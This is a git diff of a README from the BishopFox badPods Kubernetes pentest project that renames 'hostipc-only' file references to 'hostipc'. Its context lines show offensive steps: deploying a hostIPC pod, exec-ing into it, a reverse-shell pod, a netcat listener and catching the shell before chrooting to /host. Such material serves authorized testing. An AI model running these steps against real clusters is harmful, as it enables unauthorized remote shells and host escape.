@@ -22,21 +22,21 @@ spec:
   # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
   #nodeName: k8s-control-plane-node
   ```
-[pod-hostipc-only.yaml](pod-hostipc-only.yaml)
+[pod-hostipc.yaml](pod-hostipc.yaml)
 
 #### Option 1: Create pod from local yaml 
 ```bash
-kubectl apply -f pod-hostipc-only.yaml   
+kubectl apply -f pod-hostipc.yaml   
 ```
 
 #### Option 2: Create pod from github hosted yaml
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostipc-only/pod-hostipc-only.yaml  
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostipc/pod-hostipc.yaml  
 ```
 
 ### Exec into pod 
 ```bash
-kubectl -n [namespace] exec -it pod-hostipc-only -- bash
+kubectl -n [namespace] exec -it pod-hostipc -- bash
 ```
 
 ## Or, create a reverse shell pod
@@ -57,7 +57,7 @@ spec:
   # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
   #nodeName: k8s-control-plane-node
 ```
-[pod-hostipc-only-revshell.yaml](pod-hostipc-only-revshell.yaml)
+[pod-hostipc-revshell.yaml](pod-hostipc-revshell.yaml)
 
 #### Set up listener
 ```bash
@@ -68,7 +68,7 @@ nc -nvlp 3116
 ```bash
 # Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
 HOST="10.0.0.1" PORT="3116" 
-envsubst < ./yaml/hostipc-only/pod-hostipc-only-revshell.yaml | kubectl apply -f -
+envsubst < ./yaml/hostipc/pod-hostipc-revshell.yaml | kubectl apply -f -
 ```
 
 #### Catch the shell and chroot to /host 
